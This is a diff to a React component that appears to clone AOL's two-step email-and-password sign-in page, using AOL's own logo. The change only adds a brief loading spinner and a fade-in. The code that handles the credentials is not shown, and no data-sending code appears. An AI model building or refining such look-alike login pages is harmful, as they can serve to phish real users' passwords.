@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
 
@@ -35,8 +35,14 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(false);
+  const [pageReady, setPageReady] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
+
+  useEffect(() => {
+    const timer = setTimeout(() => setPageReady(true), 100);
+    return () => clearTimeout(timer);
+  }, []);
 
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
@@ -52,8 +58,16 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
     <img src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" alt="AOL" className={`select-none ${className}`} />
   );
 
+  if (!pageReady) {
+    return (
+      <div className="min-h-screen bg-white flex items-center justify-center">
+        <Spinner size="lg" color="border-blue-600" />
+      </div>
+    );
+  }
+
   return (
-    <div className="min-h-screen bg-white font-sans flex flex-col">
+    <div className="min-h-screen bg-white font-sans flex flex-col" style={{ animation: 'fadeIn 0.3s ease-in' }}>
       <header className="flex-shrink-0 flex justify-between items-center py-4 px-6 md:px-10 border-b border-gray-200">
         <AolLogo className="h-6" />
         <div className="flex items-center space-x-4 text-xs text-gray-500 font-medium">
